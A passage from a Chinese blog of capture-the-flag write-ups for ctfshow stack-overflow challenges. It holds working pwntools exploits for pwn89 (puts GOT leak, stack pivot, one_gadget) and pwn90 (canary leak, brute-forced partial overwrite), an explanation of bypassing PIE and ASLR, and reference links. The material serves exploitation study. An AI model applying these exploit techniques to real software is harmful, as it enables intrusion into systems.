<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">#p = process(&#x27;../pwn89&#x27;)</span><br><span class="line">#p = gdb.debug(&#x27;../pwn89&#x27;,&#x27;b main&#x27;)</span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;,&#x27; 28153&#x27;)</span><br><span class="line">context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">elf = ELF(&#x27;../pwn89&#x27;)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = 0x400be3</span><br><span class="line">pop_rsi_r15_ret = 0x400be1</span><br><span class="line">leave_ret = 0x40098c</span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line">puts_plt = elf.sym[&#x27;puts&#x27;]</span><br><span class="line">read_plt = elf.sym[&#x27;read&#x27;]</span><br><span class="line">bss_addr = 0x602f00</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27; * 0x1010 + p64(bss_addr - 0x8)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(0)</span><br><span class="line">payload += p64(pop_rsi_r15_ret) + p64(bss_addr) + p64(0) + p64(read_plt)</span><br><span class="line">payload += p64(leave_ret)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(0x2000,b&#x27;a&#x27;)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&quot;You want to send:&quot;,str(0x2000))</span><br><span class="line">sleep(0.5)</span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(0.5)</span><br><span class="line">p.recvuntil(&quot;See you next time!\n&quot;)</span><br><span class="line">puts_addr = u64(p.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(hex(puts_addr))</span><br><span class="line">libc = LibcSearcher(&quot;puts&quot;,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(&quot;puts&quot;)</span><br><span class="line"></span><br><span class="line"># 由于使用的不是题目虚拟机，这里也就没有对应的libc库，所以直接用wp里面给的，当然也可以直接把可能的libc全试一遍，但是这里就不这么做了。</span><br><span class="line"></span><br><span class="line"># 正确的libc是libc6_2.27-3ubuntu1.6_amd64</span><br><span class="line"></span><br><span class="line">one_gadget = libc_base + 0x4f302</span><br><span class="line"></span><br><span class="line">payload = p64(one_gadget)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="pwn90"><a href="#pwn90" class="headerlink" title="pwn90"></a>pwn90</h4><p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240903162632777.png" alt="image-20240903162632777"></p>
<p>64bit保护几乎全开</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240903163152279.png" alt="image-20240903163152279"></p>
<p>先看看主函数的逻辑</p>
<p>将canary赋值给了buf[5]，然后又将buf的0x20字节赋值为0。从stdin读入buf，使用printf输出，此处应该是使用printf的漏洞吧，然后再读入一次buf，第二次读入存在栈溢出漏洞，用于getshell。</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240903163654994.png" alt="image-20240903163654994"></p>
<p>存在一个后门函数</p>
<p>应该是可以通过printf输出canary然后栈溢出掉ret吧。根据pwn89中的文章<a target="_blank" rel="noopener" href="https://kiprey.github.io/2022/08/thread_canary/%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%BE%97%E7%9F%A5canary%E7%9A%84%E9%A6%96%E4%BD%8D%E6%98%AF/x00%EF%BC%8C%E8%BF%99%E6%98%AF%E4%B8%BA%E4%BA%86%E9%98%B2%E6%AD%A2%E5%9C%B0%E5%9D%80%E6%B3%84%E9%9C%B2%EF%BC%8C%E6%89%80%E4%BB%A5%E8%BF%99%E9%87%8C%E8%BF%98%E9%9C%80%E8%A6%81%E8%80%83%E8%99%91%E5%88%B0%E8%BF%99%E4%B8%80%E7%82%B9%EF%BC%8C%E5%B0%86/x00%E6%9B%BF%E6%8D%A2%E6%8E%89%E3%80%82">https://kiprey.github.io/2022/08/thread_canary/，可以得知canary的首位是\x00，这是为了防止地址泄露，所以这里还需要考虑到这一点，将\x00替换掉。</a></p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240903164548245.png" alt="image-20240903164548245"></p>
<p>canary就是fs:28h，然后mov [rbp-8],rax，也就是说canary在rbp-8的位置</p>
<p>在获取到canary之后，还有一个很大的问题，那就是后门函数的地址如何确定，毕竟这个程序是开了ASLR和PIE的，怎么办呢</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240903170212000.png" alt="image-20240903170212000"></p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240903171535840.png" alt="image-20240903171535840"></p>
<p>可以看到main函数的地址为0x555555400a51，而后门函数的地址为0x555555400a3e，两个地址之间只有最后两位是不同的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">在开启了 ASLR 和 PIE 保护的程序中，程序的地址空间布局会被随机化，导致程序每次运行时内存地址（特别是代码段、数据段、堆和栈的基址）都会变化。这种随机化主要通过改变内存地址的高位来实现，而低 12 位的页内偏移通常保持不变。这是因为内存分页机制的缘故。</span><br><span class="line"></span><br><span class="line">页内偏移（Page Offset）</span><br><span class="line">在现代计算机系统中，内存地址是通过分页机制进行管理的。内存地址可以被分为两个部分：</span><br><span class="line">- 高位部分：用于确定内存页的基址。</span><br><span class="line">- 低 12 位：用于表示页内的偏移（Page Offset）。在典型的 4KB 页大小的系统中，低 12 位可以表示 0x000 到 0xFFF 的偏移。</span><br><span class="line"></span><br><span class="line">ASLR 和 PIE 的影响</span><br><span class="line">- ASLR（Address Space Layout Randomization）：随机化程序的堆栈、堆、代码段和库加载基址等区域的起始地址。</span><br><span class="line">- PIE（Position Independent Executable）：使程序的代码段可以在不同的内存地址加载，这种随机化使得程序每次加载时基址都会改变。</span><br><span class="line"></span><br><span class="line">然而，由于分页机制的原因，内存地址的低 12 位（页内偏移）在地址随机化后仍然保持不变。这意味着如果我们知道某个函数或数据在某页内的偏移量，并且我们能够部分覆盖指针或地址的低位，就可以在一定程度上控制程序的执行流，即使程序启用了 ASLR 和 PIE。</span><br><span class="line"></span><br><span class="line">绕过 PIE 保护的思路</span><br><span class="line">- 部分覆盖：通过 `Partial Overwrite` 技巧，我们可以尝试覆盖内存地址的低 12 位，使其跳转到我们控制的内存区域或绕过某些安全检查。例如，如果我们可以将返回地址的低 12 位改为我们希望的偏移（而不改变高位），那么即使程序的基址在不同运行中随机化，我们仍然可以将程序跳转到预期的地址范围内。</span><br><span class="line"></span><br><span class="line">- 页内漏洞利用：如果我们找到一个目标地址的页内偏移（低 12 位），可以尝试将一个受控制的地址部分覆盖，使其指向同一页内的不同位置。例如，如果某个函数的地址是 `0x08049000`，而你控制的 shellcode 位于 `0x08049F00`，通过部分覆盖（改变低位 `0x000` 为 `0xF00`），你可以使程序跳转到你的 shellcode。</span><br><span class="line"></span><br><span class="line">举例说明</span><br><span class="line">假设程序在开启了 ASLR 和 PIE 后，某函数的地址是 `0x7fff00001234`，其中低 12 位是 `0x1234`。在不同的运行中，基址 `0x7fff0000` 会随机化，但偏移 `0x1234` 始终固定。如果我们通过漏洞控制了某个指针的低位，将其改为 `0x1234`，则可以让程序跳转到对应偏移的地址，从而实现漏洞利用。</span><br><span class="line"></span><br><span class="line">总结</span><br><span class="line">通过理解页内偏移在 ASLR 和 PIE 保护下的特性，我们可以通过部分覆盖技术有效地控制程序的执行流，绕过这些保护机制。在实践中，这种技巧需要精确控制和理解目标程序的内存布局，以及对可控地址的正确覆盖，以实现可靠的漏洞利用。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">elf = ELF(&#x27;../pwn90&#x27;)</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">	try:       </span><br><span class="line">		p = remote(&#x27;pwn.challenge.ctf.show&#x27;,&#x27; 28126&#x27;)</span><br><span class="line">		offset = 0x30 - 0x8 + 1</span><br><span class="line">		payload = cyclic(offset)</span><br><span class="line">		p.sendafter(&#x27;Welcome CTFshow:\n&#x27;,payload)</span><br><span class="line">		# 接收输出的数据</span><br><span class="line">		p.recvuntil(payload)               </span><br><span class="line">		canary = b&#x27;\0&#x27; + p.recvn(7)</span><br><span class="line">		payload =  cyclic(offset - 1) + (canary) + p64(0) + b&#x27;\x3E&#x27;</span><br><span class="line">		p.send(payload)</span><br><span class="line">		p.interactive()</span><br><span class="line">	except Exception as e:</span><br><span class="line">		p.close()</span><br><span class="line">		print(e)</span><br></pre></td></tr></table></figure>

<p>破防了，成功率太看脸了，只能说原理是这么个原理，至于能不能成功getshell就看运气吧。</p>
<p>至此，栈溢出结束。</p>
<h4 id="Reference2"><a href="#Reference2" class="headerlink" title="Reference2"></a>Reference2</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/yidianhan/p/13098817.html(gdb常用命令)</span><br><span class="line">https://blog.csdn.net/happyblreay/article/details/104226884(movaps命令导致的错误)</span><br><span class="line">https://www.d1lete.online/article/71(pwn38栈平衡)</span><br><span class="line">https://blog.csdn.net/Maxmalloc/article/details/82959801(x64传参，寄存器传参)</span><br><span class="line">https://tearorca.github.io/32%E4%BD%8D%E5%92%8C64%E4%BD%8D%E5%9C%A8pwn%E4%B8%AD%E7%9A%84%E4%B8%8D%E5%90%8C%E7%82%B9/(寄存器传参)</span><br><span class="line">https://blog.csdn.net/txx_683/article/details/53454307(各种不同的cpu和文件)</span><br><span class="line">https://blog.csdn.net/weixin_63576152/article/details/132437169(pwn35-pwn40)</span><br><span class="line">http://www.awsg.online/index.php/archives/16/(pwn35-pwn40)</span><br><span class="line">https://www.cnblogs.com/idorax/p/7286870.html(gdb_write)</span><br><span class="line">https://www.cnblogs.com/liulangbxc/p/17390529.html(libc基址)</span><br><span class="line">https://blog.csdn.net/weixin_63576152/article/details/132499511(pwn41-pwn48wp)</span><br><span class="line">https://blog.csdn.net/weixin_52635170/article/details/131614485(pwn49wp)</span><br><span class="line">https://www.apiref.com/cpp-zh/cpp/string/byte/strcat.html(strcat函数)</span><br><span class="line">https://blog.csdn.net/SmalOSnail/article/details/105236336(alpha3)</span><br><span class="line">https://xz.aliyun.com/t/12787?time__1311=GqGxu7G%3DTxlr%3DiQGkDRGKKi%3DGCIIYAYx(栈沙箱学习之orw)</span><br><span class="line">https://www.anquanke.com/post/id/236832(栈溢出技巧orw)</span><br><span class="line">https://xz.aliyun.com/t/6645?time__1311=n4%2BxnD0Dg7%3DYq0KDtD%2FiW4BK57KT9GuhG2DTD#toc-5(shellcode的艺术)</span><br><span class="line">https://blog.csdn.net/akdelt/article/details/135954144(非官方wp，但是写得很详细)</span><br><span class="line">https://www.cnblogs.com/max1z/p/15299000.html#%E6%A0%88%E8%BF%81%E7%A7%BB(栈迁移，写得非常好)</span><br><span class="line">https://blog.csdn.net/fjh1997/article/details/105434992(调试小技巧)</span><br><span class="line">https://www.cnblogs.com/ilocker/p/4604802.html(elf文件格式)</span><br></pre></td></tr></table></figure>

</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://zx2023qj.github.io">zx</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://zx2023qj.github.io/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/">https://zx2023qj.github.io/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://zx2023qj.github.io" target="_blank">zx's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pwn/">pwn</a><a class="post-meta__tags" href="/tags/ctfshow/">ctfshow</a></div><div class="post_share"><div class="social-share" data-image="/img/3.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/09/03/brop/" title="brop"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">brop</div></div></a></div><div class="next-post pull-right"><a href="/2024/09/02/%E5%BF%83%E6%83%85%E4%B8%8D%E5%A5%BD%E5%86%99%E7%82%B9/" title="心情不好写点 &amp; 2024年8月总结"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">心情不好写点 &amp; 2024年8月总结</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/06/28/pwn0-34/" title="pwn0-34"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-28</div><div class="title">pwn0-34</div></div></a></div><div><a href="/2024/09/03/brop/" title="brop"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-03</div><div class="title">brop</div></div></a></div><div><a href="/2024/09/05/pwn91-100%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" title="pwn91-100格式化字符串"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-05</div><div class="title">pwn91-100格式化字符串</div></div></a></div><div><a href="/2024/09/07/pwn101-110%E6%95%B4%E6%95%B0%E5%AE%89%E5%85%A8/" title="pwn101-110整数安全"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-07</div><div class="title">pwn101-110整数安全</div></div></a></div><div><a href="/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/" title="pwn111-134bypass安全机制"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-20</div><div class="title">pwn111-134bypass安全机制</div></div></a></div><div><a href="/2024/10/13/pwn135-159%E5%A0%86%E5%89%8D%E7%BD%AE/" title="pwn135-159堆前置"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-13</div><div class="title">pwn135-159堆前置</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/3.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">zx</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">29</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">29</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">19</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/zx2023qj"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-%E6%A0%88%E6%BA%A2%E5%87%BA"><span class="toc-number">1.</span> <span class="toc-text">0x01 栈溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn35"><span class="toc-number">1.1.</span> <span class="toc-text">pwn35</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn36"><span class="toc-number">1.2.</span> <span class="toc-text">pwn36</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn37"><span class="toc-number">1.3.</span> <span class="toc-text">pwn37</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn38"><span class="toc-number">1.4.</span> <span class="toc-text">pwn38</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#movaps%E5%B0%8F%E7%9F%A5%E8%AF%86"><span class="toc-number">1.4.1.</span> <span class="toc-text">movaps小知识</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn39"><span class="toc-number">1.5.</span> <span class="toc-text">pwn39</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn40"><span class="toc-number">1.6.</span> <span class="toc-text">pwn40</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn41"><span class="toc-number">1.7.</span> <span class="toc-text">pwn41</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn42"><span class="toc-number">1.8.</span> <span class="toc-text">pwn42</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn43"><span class="toc-number">1.9.</span> <span class="toc-text">pwn43</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn44"><span class="toc-number">1.10.</span> <span class="toc-text">pwn44</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn45"><span class="toc-number">1.11.</span> <span class="toc-text">pwn45</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn46"><span class="toc-number">1.12.</span> <span class="toc-text">pwn46</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn47"><span class="toc-number">1.13.</span> <span class="toc-text">pwn47</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn48"><span class="toc-number">1.14.</span> <span class="toc-text">pwn48</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn49"><span class="toc-number">1.15.</span> <span class="toc-text">pwn49</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn50"><span class="toc-number">1.16.</span> <span class="toc-text">pwn50</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn51"><span class="toc-number">1.17.</span> <span class="toc-text">pwn51</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn52"><span class="toc-number">1.18.</span> <span class="toc-text">pwn52</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn53"><span class="toc-number">1.19.</span> <span class="toc-text">pwn53</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn54"><span class="toc-number">1.20.</span> <span class="toc-text">pwn54</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#strcat%E5%87%BD%E6%95%B0"><span class="toc-number">1.20.1.</span> <span class="toc-text">strcat函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#fgets%E5%87%BD%E6%95%B0"><span class="toc-number">1.20.2.</span> <span class="toc-text">fgets函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#puts%E5%87%BD%E6%95%B0"><span class="toc-number">1.20.3.</span> <span class="toc-text">puts函数</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn55"><span class="toc-number">1.21.</span> <span class="toc-text">pwn55</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn56"><span class="toc-number">1.22.</span> <span class="toc-text">pwn56</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn57"><span class="toc-number">1.23.</span> <span class="toc-text">pwn57</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn58"><span class="toc-number">1.24.</span> <span class="toc-text">pwn58</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn59"><span class="toc-number">1.25.</span> <span class="toc-text">pwn59</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn60"><span class="toc-number">1.26.</span> <span class="toc-text">pwn60</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn61"><span class="toc-number">1.27.</span> <span class="toc-text">pwn61</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn62"><span class="toc-number">1.28.</span> <span class="toc-text">pwn62</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn63"><span class="toc-number">1.29.</span> <span class="toc-text">pwn63</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn64"><span class="toc-number">1.30.</span> <span class="toc-text">pwn64</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#mmap%E8%A1%A5%E5%85%85"><span class="toc-number">1.30.1.</span> <span class="toc-text">mmap补充</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn65"><span class="toc-number">1.31.</span> <span class="toc-text">pwn65</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#cdqe%E6%8C%87%E4%BB%A4"><span class="toc-number">1.31.1.</span> <span class="toc-text">cdqe指令</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#movzx%E6%8C%87%E4%BB%A4"><span class="toc-number">1.31.2.</span> <span class="toc-text">movzx指令</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn66"><span class="toc-number">1.32.</span> <span class="toc-text">pwn66</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn67"><span class="toc-number">1.33.</span> <span class="toc-text">pwn67</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#readgsdword-%E5%87%BD%E6%95%B0"><span class="toc-number">1.33.1.</span> <span class="toc-text">__readgsdword()函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#TEB%EF%BC%8Cgs%E5%AF%84%E5%AD%98%E5%99%A8%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85"><span class="toc-number">1.33.2.</span> <span class="toc-text">TEB，gs寄存器知识补充</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#nop-sled%E6%8A%80%E5%B7%A7"><span class="toc-number">1.33.3.</span> <span class="toc-text">nop sled技巧</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn68"><span class="toc-number">1.34.</span> <span class="toc-text">pwn68</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn69"><span class="toc-number">1.35.</span> <span class="toc-text">pwn69</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%89%A7%E8%A1%8Cjmp%E6%8C%87%E4%BB%A4%E5%90%8E"><span class="toc-number">1.35.1.</span> <span class="toc-text">执行jmp指令后</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%89%A7%E8%A1%8Cret%E6%8C%87%E4%BB%A4%E5%90%8E"><span class="toc-number">1.35.2.</span> <span class="toc-text">执行ret指令后</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%89%A7%E8%A1%8Cleave%E6%8C%87%E4%BB%A4%E5%90%8E"><span class="toc-number">1.35.3.</span> <span class="toc-text">执行leave指令后</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn70"><span class="toc-number">1.36.</span> <span class="toc-text">pwn70</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#strlen%E5%8E%9F%E7%90%86"><span class="toc-number">1.36.1.</span> <span class="toc-text">strlen原理</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn71"><span class="toc-number">1.37.</span> <span class="toc-text">pwn71</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ret2syscall%E8%A1%A5%E5%85%85"><span class="toc-number">1.37.1.</span> <span class="toc-text">ret2syscall补充</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn72"><span class="toc-number">1.38.</span> <span class="toc-text">pwn72</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn73"><span class="toc-number">1.39.</span> <span class="toc-text">pwn73</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn74"><span class="toc-number">1.40.</span> <span class="toc-text">pwn74</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#one-gadget%E8%A1%A5%E5%85%85"><span class="toc-number">1.40.1.</span> <span class="toc-text">one_gadget补充</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn75"><span class="toc-number">1.41.</span> <span class="toc-text">pwn75</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#pop-eip%E8%A1%A5%E5%85%85"><span class="toc-number">1.41.1.</span> <span class="toc-text">pop eip补充</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#pop-ebp%E8%A1%A5%E5%85%85"><span class="toc-number">1.41.2.</span> <span class="toc-text">pop ebp补充</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn76"><span class="toc-number">1.42.</span> <span class="toc-text">pwn76</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn77"><span class="toc-number">1.43.</span> <span class="toc-text">pwn77</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn78"><span class="toc-number">1.44.</span> <span class="toc-text">pwn78</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ret2syscall%E8%A1%A5%E5%85%85-1"><span class="toc-number">1.44.1.</span> <span class="toc-text">ret2syscall补充</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn79"><span class="toc-number">1.45.</span> <span class="toc-text">pwn79</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn80"><span class="toc-number">1.46.</span> <span class="toc-text">pwn80</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn81"><span class="toc-number">1.47.</span> <span class="toc-text">pwn81</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E8%BE%93%E5%87%BA%E5%9C%B0%E5%9D%80%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">1.47.1.</span> <span class="toc-text">读取输出地址的方法</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" 